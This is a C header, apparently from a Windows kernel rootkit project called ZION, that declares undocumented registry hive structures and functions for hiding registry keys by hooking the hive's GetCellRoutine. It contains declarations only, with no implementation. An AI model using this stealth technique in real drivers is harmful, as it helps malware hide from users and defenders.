/*
 *      name: ZION system File Hive Register kernel
 *      Org Author: Liang Chen
 *		Reference: Pediy: 也谈rootkit 注册表信息隐藏，http://bbs.pediy.com/showthread.php?p=444198&mode=threaded
 *      Version : 0.2
 */
#pragma once
#include <ntddk.h>
#include <windef.h>
#include <memory.h>
#include "zion/server/zion_common.h"
#include "zion/zion_cmd_packet.h"
#include "../include/zion/zion_dkom_def.h" 
#include "zion_server_helper.h"
#include "zion_server.h"
#pragma pack(1)
#define CM_KEY_INDEX_ROOT      0x6972        
#define CM_KEY_INDEX_LEAF      0x696c        
#define CM_KEY_FAST_LEAF       0x666c      
#define CM_KEY_HASH_LEAF       0x686c        

#define HIVE_ADDRESS_OFFSET		0x10
#define CELL_ADDRESS_OFFSET		0x14

typedef struct _CM_KEY_NODE {
       USHORT Signature;
       USHORT Flags;
       LARGE_INTEGER LastWriteTime;
       ULONG Spare;               
       HANDLE Parent;
       ULONG SubKeyCounts[2];     
       HANDLE SubKeyLists[2];     
       
} CM_KEY_NODE, *PCM_KEY_NODE;

typedef struct _CM_KEY_INDEX {
       USHORT Signature;
       USHORT Count;
       HANDLE List[1];
} CM_KEY_INDEX, *PCM_KEY_INDEX;

typedef struct _CM_KEY_BODY {
       ULONG Type;             
       PVOID KeyControlBlock;
       PVOID NotifyBlock;
       PEPROCESS Process;      
       LIST_ENTRY KeyBodyList; 
} CM_KEY_BODY, *PCM_KEY_BODY;

typedef PVOID (__stdcall *PGET_CELL_ROUTINE)(PVOID, HANDLE);

typedef struct _HHIVE {
       ULONG Signature;
       PGET_CELL_ROUTINE GetCellRoutine;
       // ...
} HHIVE, *PHHIVE;

#pragma pack()

PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node);
BOOL HideRegistryByHookHiveRoutine(WCHAR * RegKeyPath);
BOOL Hive_Registry_SERVER(PVOID ptrBufferAddr);
PVOID ZionNetGetCellRoutine(PVOID Hive, HANDLE Cell);
extern PGET_CELL_ROUTINE zion_pGetCellRoutine ;
extern PGET_CELL_ROUTINE* zion_ptrGetCellRoutine;

extern PCM_KEY_NODE zion_HideNode;
extern PCM_KEY_NODE zion_LastNode;
